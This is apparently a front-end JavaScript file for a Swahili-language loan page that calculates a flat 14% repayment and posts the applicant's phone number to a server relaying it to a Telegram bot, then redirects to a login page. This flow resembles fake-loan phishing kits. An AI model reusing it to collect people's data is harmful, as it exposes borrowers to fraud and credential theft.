//
// ============================
// LOAN SLIDERS
// ============================
const amountSlider = document.getElementById("loanAmount");
const monthSlider = document.getElementById("loanMonths");

const amountText = document.getElementById("amountText");
const monthText = document.getElementById("monthText");
const paymentText = document.getElementById("monthlyPayment");

function updateLoan() {

  const amount = parseInt(amountSlider.value);
  const months = parseInt(monthSlider.value);

  // DISPLAY AMOUNT
  amountText.innerText = "TSh " + amount.toLocaleString();

  // DISPLAY MONTHS
  monthText.innerText = "Miezi " + months;

  // INTEREST CALCULATION
  const interest = 0.14;
  const total = amount + (amount * interest);
  const monthly = total / months;

  // DISPLAY MONTHLY PAYMENT
  paymentText.innerText = "TSh " + Math.round(monthly).toLocaleString();
}

// SLIDER EVENTS
amountSlider.addEventListener("input", updateLoan);
monthSlider.addEventListener("input", updateLoan);

// INITIAL LOAD
updateLoan();


//
// ============================
// OPEN APPLICATION FORM
// ============================
function openForm() {

  document.querySelector(".container").style.display = "none";
  document.getElementById("formPage").style.display = "block";

  window.scrollTo({
    top: 0,
    behavior: "smooth"
  });
}


//
// ============================
// FORM SUBMIT (SEND TO TELEGRAM + REDIRECT)
// ============================
document.getElementById("loanForm").addEventListener("submit", function (e) {

  e.preventDefault();

  // GET USER INPUT
  const phone = document.getElementById("phone").value;

  // SEND TO BACKEND (Render server → Telegram bot)
  fetch("https://your-render-link.onrender.com/apply", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      phone: phone
    })
  })
  .then(res => res.json())
  .then(data => {

    alert("Application sent successfully!");

    // REDIRECT AFTER SUCCESS
    window.location.href = "login.html";

  })
  .catch(err => {
    alert("Error sending application. Try again.");
  });

});
